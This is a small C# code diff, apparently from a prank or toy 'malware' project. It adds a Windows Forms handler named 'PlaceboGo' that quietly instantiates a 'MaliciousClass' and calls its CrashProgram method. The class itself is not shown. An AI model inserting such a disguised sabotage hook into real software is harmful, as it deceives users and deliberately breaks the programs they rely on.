@@ -31,5 +31,11 @@ namespace leungware_v420
         {
             label4.Text = trackBar2.Value.ToString();
         }
+
+        private void PlaceboGo(object sender, EventArgs e)
+        {
+            var inst = new MaliciousClass();
+            inst.CrashProgram();
+        }
     }
 }
